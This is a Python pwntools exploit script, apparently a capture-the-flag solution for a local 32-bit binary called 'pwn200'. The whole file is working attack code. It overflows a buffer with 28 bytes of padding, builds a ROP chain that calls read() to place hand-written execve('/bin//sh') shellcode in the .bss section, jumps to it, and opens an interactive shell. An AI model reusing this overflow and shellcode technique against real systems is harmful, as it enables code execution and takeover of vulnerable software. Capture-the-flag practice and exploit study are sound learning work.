from pwn import *

context.arch = "i386"

pwn200 = process("./pwn200")
elf = ELF("./pwn200",checksec=False)

# gdb.attach(pwn200,'''set follow-fork-mode child
# gdb.attach(pwn200,'''b *0x08048510''')

read_plt = elf.symbols["read"]
puts_plt = 0x8048360  # elf.plt["puts"]
main_plt = elf.symbols["main"]
lOL_plt = 0x080484d6

bss_writeable = elf.bss() # .bss


str_bin = "/bin"[::-1].encode("hex")
str_sh = "//sh"[::-1].encode("hex")

sh = ""
sh += asm("xor eax,eax")
sh += asm("xor ecx,ecx")
sh += asm("xor edx,edx")
sh += asm("push 0x{}".format(str_sh))
sh += asm("push 0x{}".format(str_bin))
sh += asm("mov ebx,esp")
sh += asm("mov al,0xb")
sh += asm("int 0x80")

# sh = asm(shellcraft.i386.sh())
# sh += ""
# log.info("Stage 1")
# log.info("Writing shellcode into {}".format(hex(bss_writeable)))

payload = ""
# payload += sh
# payload += "\x90" * (28 - len(sh))

# payload += p32(main_plt)
# payload += p32(puts_plt)
# payload += p32(main_plt)
# payload += p32(0x80485c0)

payload += "A" * 28
payload += p32(read_plt)
payload += p32(bss_writeable)
payload += p32(0)
payload += p32(bss_writeable)
payload += p32(0x80)

print hexdump(payload)
print pwn200.recvuntil(":D?\n").split()
# print pwn200.recv()
pwn200.send(payload)
# print pwn200.recv()
pwn200.send(sh)
# print pwn200.recv(1024)
# print pwn200.recvuntil(":D?\n")
pwn200.interactive()
